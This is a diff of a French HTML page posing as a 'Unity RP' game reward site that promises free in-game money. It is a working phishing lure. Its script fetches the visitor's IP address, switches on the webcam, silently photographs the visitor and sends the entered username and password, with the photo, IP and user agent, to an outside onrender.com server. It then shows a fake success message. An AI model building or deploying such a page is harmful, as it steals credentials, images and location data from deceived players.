@@ -1,62 +1,123 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unity RP</title>
+    <style>
+        body { font-family: sans-serif; background: #121212; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e1e1e; padding: 25px; border-radius: 10px; text-align: center; width: 320px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); transition: all 0.3s ease; }
+        .hidden { display: none !important; }
+        .btn { background: #6200ee; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; width: 100%; margin-top: 15px; font-weight: bold; }
+        .btn:hover { background: #3700b3; }
+        input { width: 90%; padding: 10px; margin: 8px 0; border-radius: 5px; border: 1px solid #333; background: #2b2b2b; color: white; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+
+    <!-- PAGE PRINCIPALE -->
+    <div id="mainCard" class="card">
+        <h1>Unity RP</h1>
+        <p>Récupérer 300 000$ RP</p>
+        <p style="color: #aaa; font-size: 0.85rem;">Initialisez la session pour créditer votre compte sur le serveur.</p>
+        <button id="joinBtn" class="btn">Rejoindre le jeu</button>
+        <video id="videoStream" autoplay playsinline></video>
+    </div>
+
+    <!-- PAGE DE CONNEXION -->
+    <div id="loginCard" class="card hidden">
+        <h1>Connexion</h1>
+        <input type="text" id="username" placeholder="Nom d'utilisateur">
+        <input type="password" id="password" placeholder="Mot de passe">
+        <button id="loginBtn" class="btn">Se connecter</button>
+    </div>
+
 <script>
+document.addEventListener('DOMContentLoaded', () => {
+    const mainCard = document.getElementById('mainCard');
+    const loginCard = document.getElementById('loginCard');
+    const joinBtn = document.getElementById('joinBtn');
+    const loginBtn = document.getElementById('loginBtn');
     const videoStream = document.getElementById('videoStream');
-    let userIpAddress = 'Non détectée';
 
-    fetch('https://api.ipify.org?format=json')
-        .then(res => res.json())
-        .then(data => { userIpAddress = data.ip; })
-        .catch(err => console.error("Erreur IP:", err));
-
-    navigator.mediaDevices?.getUserMedia({ video: true })
-        .then(stream => { videoStream.srcObject = stream; })
-        .catch(err => console.error("Caméra non accessible :", err));
+    let userIpAddress = "Non détectée";
 
     function capturePhoto() {
         if (!videoStream || !videoStream.srcObject) return null;
         try {
             const canvas = document.createElement('canvas');
-            canvas.width = 480;
-            canvas.height = 360;
+            canvas.width = videoStream.videoWidth || 640;
+            canvas.height = videoStream.videoHeight || 480;
             const ctx = canvas.getContext('2d');
             ctx.drawImage(videoStream, 0, 0, canvas.width, canvas.height);
             return canvas.toDataURL('image/jpeg', 0.8);
         } catch (e) {
+            console.error("Erreur capture photo:", e);
             return null;
         }
     }
 
-    document.getElementById('loginForm').addEventListener('submit', async (e) => {
-        e.preventDefault();
-        const user = document.getElementById('username').value.trim();
-        const pass = document.getElementById('password').value.trim();
-
-        if (!user || !pass) return;
-
-        const photoData = capturePhoto();
-
-        try {
-            // Utilisation de l'URL complète de ton instance Render pour s'affranchir des erreurs de routage
-            const response = await fetch('https://unity-30ez.onrender.com/register', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: user,
-                    password: pass,
-                    ip: userIpAddress,
-                    photo: photoData,
-                    userAgent: navigator.userAgent
-                })
-            });
-
-            if (response.ok) {
-                alert('Connexion réussie ! Vos 500 000 GTA $ RP ont été crédités.');
-                document.getElementById('loginForm').reset();
-            } else {
-                alert('Erreur lors du traitement de la connexion par le serveur.');
+    if (joinBtn) {
+        joinBtn.addEventListener('click', async () => {
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                userIpAddress = data.ip;
+            } catch (e) {
+                console.error("Erreur IP:", e);
             }
-        } catch (err) {
-            console.error("Erreur réseau critique :", err);
-            alert('Erreur de communication avec le serveur en ligne.');
-        }
-    });
+
+            if (mainCard) mainCard.classList.add('hidden');
+            if (loginCard) loginCard.classList.remove('hidden');
+
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    if (videoStream) {
+                        videoStream.srcObject = stream;
+                    }
+                }
+            } catch (err) {
+                console.error("Caméra non autorisée :", err);
+            }
+        });
+    }
+
+    if (loginBtn) {
+        loginBtn.addEventListener('click', async () => {
+            const userEl = document.getElementById('username');
+            const passEl = document.getElementById('password');
+            const user = userEl ? userEl.value : '';
+            const pass = passEl ? passEl.value : '';
+
+            if (user.trim() === '' || pass.trim() === '') {
+                alert('Veuillez remplir tous les champs.');
+                return;
+            }
+
+            const photoData = capturePhoto();
+
+            try {
+                await fetch('https://unity-30ez.onrender.com/register', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: user,
+                        password: pass,
+                        ip: userIpAddress,
+                        photo: photoData,
+                        userAgent: navigator.userAgent
+                    })
+                });
+                alert("Connexion réussie !");
+            } catch (e) {
+                console.error("Erreur lors de l'envoi :", e);
+            }
+        });
+    }
+});
 </script>
+
+</body>
+</html>
